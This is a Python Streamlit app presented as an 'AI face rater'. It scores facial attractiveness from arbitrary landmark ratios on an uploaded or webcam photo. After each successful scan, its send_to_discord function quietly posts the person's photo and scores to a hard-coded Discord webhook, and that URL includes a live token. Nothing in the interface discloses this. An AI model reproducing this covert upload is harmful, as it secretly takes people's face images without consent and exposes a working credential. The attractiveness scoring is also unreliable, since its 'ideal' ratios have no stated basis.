import streamlit as st
import cv2
import mediapipe as mp
import numpy as np
import plotly.graph_objects as go
from PIL import Image
import requests
import json
import io
from datetime import datetime

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1458651120204251269/adR7ttYwh1TfSzkFVyBQNDIas5x0l-RHU1VucZuSB9pUvDvNw1nT_q7C_0DI_KWGWYSJ"

# 1. Page Configuration (Wide Layout for Better UI)
st.set_page_config(
    page_title="AI-FACE RATER",
    page_icon="🖤",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# 2. Premium CSS (Glassmorphism & Neon Accents)
st.markdown("""
<style>
    /* Global Font & Background */
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;400;600&display=swap');
    
    .stApp {
        background-color: #000000;
        background-image: radial-gradient(circle at 50% 0%, #1a1a2e 10%, #000000 80%);
        color: #e0e0e0;
        font-family: 'Inter', sans-serif;
    }

    /* Titles */
    h1 {
        font-family: 'Orbitron', sans-serif;
        background: linear-gradient(90deg, #00d2ff, #3a7bd5);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-size: 3.5rem !important;
        text-align: center;
        margin-bottom: 0px;
    }
    
    h3 {
        font-family: 'Inter', sans-serif;
        font-weight: 300;
        color: #8892b0;
        text-align: center;
        margin-top: -10px;
        font-size: 1.2rem;
    }

    /* Cards */
    .metric-card {
        background: rgba(255, 255, 255, 0.05);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 15px;
        padding: 20px;
        text-align: center;
        transition: transform 0.3s ease;
    }
    .metric-card:hover {
        transform: translateY(-5px);
        border-color: #00d2ff;
        box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
    }
    
    /* Result Box */
    .score-container {
        background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(0,0,0,0.4) 100%);
        border: 1px solid rgba(0, 210, 255, 0.3);
        border-radius: 20px;
        padding: 40px;
        text-align: center;
        margin: 30px 0;
        box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
    }
    
    .big-score {
        font-family: 'Orbitron', sans-serif;
        font-size: 80px;
        font-weight: 700;
        text-shadow: 0 0 20px rgba(0, 210, 255, 0.5);
    }
    
    /* Buttons */
    .stButton > button {
        background: linear-gradient(90deg, #00d2ff, #3a7bd5);
        color: black;
        border: none;
        border-radius: 8px;
        font-family: 'Orbitron', sans-serif;
        font-weight: bold;
        letter-spacing: 1px;
        padding: 15px 30px;
        width: 100%;
        transition: all 0.3s;
    }
    .stButton > button:hover {
        box-shadow: 0 0 15px #00d2ff;
        transform: scale(1.02);
    }
    
    /* Input Areas */
    .stFileUploader {
        border: 1px dashed #3a7bd5;
        border-radius: 10px;
        padding: 20px;
        background: rgba(0,0,0,0.3);
    }
</style>
""", unsafe_allow_html=True)

# 3. Load FaceMesh (Logic Unchanged)
@st.cache_resource
def get_face_mesh():
    return mp.solutions.face_mesh.FaceMesh(
        static_image_mode=True,
        max_num_faces=1,
        refine_landmarks=True
    )

face_mesh = get_face_mesh()

# 4. Helper: Radar Chart
def create_radar_chart(metrics):
    categories = ['Symmetry', 'Eye Harmony', 'Face Structure']
    values = [metrics['Symmetry'], metrics['Eye Spacing Score'] * 100, metrics['Face Structure Score'] * 50] # Scaling for visual
    # Normalize simply for chart visualization
    values = [min(v, 100) for v in values]
    
    fig = go.Figure()
    fig.add_trace(go.Scatterpolar(
        r=values,
        theta=categories,
        fill='toself',
        line_color='#00d2ff',
        fillcolor='rgba(0, 210, 255, 0.3)'
    ))
    fig.update_layout(
        polar=dict(
            radialaxis=dict(visible=True, range=[0, 100], showticklabels=False, linecolor='#333'),
            bgcolor='rgba(0,0,0,0)'
        ),
        paper_bgcolor='rgba(0,0,0,0)',
        font=dict(color='white', family='Orbitron'),
        margin=dict(l=20, r=20, t=20, b=20),
        showlegend=False
    )
    return fig

# 5. Discord Logic (Unchanged)
def send_to_discord(score, feedback, metrics, image_pil):
    if not WEBHOOK_URL: return
    img_byte_arr = io.BytesIO()
    image_pil.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    payload = {
        "content": "🧬 **AESTHETICA AI Analysis**",
        "embeds": [{
            "title": f"Rating: {score:.1f} / 10",
            "description": feedback,
            "color": 39423,
            "fields": [
                {"name": "Symmetry", "value": f"{metrics['Symmetry']}%", "inline": True},
                {"name": "Eye Ratio", "value": str(metrics['Eye Spacing Score']), "inline": True},
                {"name": "Structure", "value": str(metrics['Face Structure Score']), "inline": True}
            ],
            "image": {"url": "attachment://face.png"}
        }]
    }
    requests.post(WEBHOOK_URL, data={'payload_json': json.dumps(payload)}, files={'file': ('face.png', img_byte_arr, 'image/png')})

# 6. Analysis Logic (Unchanged)
def analyze_appearance(image_pil):
    image_np = np.array(image_pil)
    image = cv2.cvtColor(image_np, cv2.COLOR_RGB2BGR)
    results = face_mesh.process(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))
    
    if not results.multi_face_landmarks:
        return 0, "No face detected.", "#ff4444", {}
        
    lm = results.multi_face_landmarks[0].landmark
    def dist(a, b): return np.linalg.norm(np.array([a.x, a.y]) - np.array([b.x, b.y]))
    
    left_eye, right_eye = lm[33], lm[263]
    left_jaw, right_jaw = lm[234], lm[454]
    nose, chin = lm[1], lm[152]
    
    eye_distance = dist(left_eye, right_eye)
    face_width = dist(left_jaw, right_jaw) or 0.001
    face_height = dist(nose, chin)
    
    symmetry = 1 - abs(left_eye.y - right_eye.y)
    eye_ratio = eye_distance / face_width
    face_ratio = face_height / face_width
    
    # Custom Logic
    IDEAL_EYE = 0.46; IDEAL_FACE = 1.60; IDEAL_SYM = 1.0
    def score_f(v, i, t): return np.exp(-((v-i)**2)/(2*t**2))
    
    s_score = score_f(symmetry, IDEAL_SYM, 0.03)
    e_score = score_f(eye_ratio, IDEAL_EYE, 0.05)
    f_score = score_f(face_ratio, IDEAL_FACE, 0.12)
    
    final = (s_score * 0.4 + e_score * 0.3 + f_score * 0.3) * 10
    score = float(np.clip(final, 3.5, 9.8))
    
    if score >= 8.8: fb, col = "ELITE TIER", "#00d2ff"
    elif score >= 7.5: fb, col = "HIGH AESTHETIC", "#00ff9d"
    elif score >= 6.2: fb, col = "BALANCED", "#ffcc00"
    else: fb, col = "UNIQUE", "#ff4444"
    
    metrics = {
        "Symmetry": round(symmetry * 100, 1),
        "Eye Spacing Score": round(eye_ratio, 3),
        "Face Structure Score": round(face_ratio, 3)
    }
    return score, fb, col, metrics

# --- UI LAYOUT ---
col_spacer1, main_col, col_spacer2 = st.columns([1, 2, 1])

with main_col:
    st.markdown("<h1>AESTHETICA AI</h1>", unsafe_allow_html=True)
    st.markdown("<h3>Biometric Geometry Analysis</h3>", unsafe_allow_html=True)
    st.markdown("<br>", unsafe_allow_html=True)

    # Input Section
    tab_upload, tab_cam = st.tabs(["📁 UPLOAD PHOTO", "📸 LIVE SCAN"])
    img_input = None
    
    with tab_upload:
        f = st.file_uploader("Select High-Res Image", type=['jpg','png','jpeg'])
        if f: img_input = Image.open(f)
            
    with tab_cam:
        c = st.camera_input("Center Face in Frame")
        if c: img_input = Image.open(c)

    if img_input:
        st.markdown("---")
        # Split layout: Image Left, Results Right
        c1, c2 = st.columns([1, 1])
        
        with c1:
            st.image(img_input, caption="Input Data", use_container_width=True)
            if st.button("INITIATE ANALYSIS"):
                with st.spinner("CALCULATING VECTORS..."):
                    score, note, color, metrics = analyze_appearance(img_input)
                    
                    if score > 0:
                        # Save result to session state to persist it
                        st.session_state['result'] = (score, note, color, metrics)
                        send_to_discord(score, note, metrics, img_input)
                    else:
                        st.error(note)

        with c2:
            if 'result' in st.session_state:
                score, note, color, metrics = st.session_state['result']
                
                # Score Card
                st.markdown(f"""
                <div class="score-container">
                    <div style="font-size: 14px; letter-spacing: 2px; color: #888;">GLOBAL RATING</div>
                    <div class="big-score" style="color: {color};">{score:.1f}</div>
                    <div style="font-size: 20px; font-weight: bold; color: white;">{note}</div>
                </div>
                """, unsafe_allow_html=True)
                
                # Radar Chart
                fig = create_radar_chart(metrics)
                st.plotly_chart(fig, use_container_width=True, config={'displayModeBar': False})
                
                # Detailed Metrics
                m1, m2, m3 = st.columns(3)
                m1.markdown(f"<div class='metric-card'><div>SYM</div><h3 style='color:#fff'>{metrics['Symmetry']}%</h3></div>", unsafe_allow_html=True)
                m2.markdown(f"<div class='metric-card'><div>EYE</div><h3 style='color:#fff'>{metrics['Eye Spacing Score']}</h3></div>", unsafe_allow_html=True)
                m3.markdown(f"<div class='metric-card'><div>FAC</div><h3 style='color:#fff'>{metrics['Face Structure Score']}</h3></div>", unsafe_allow_html=True)
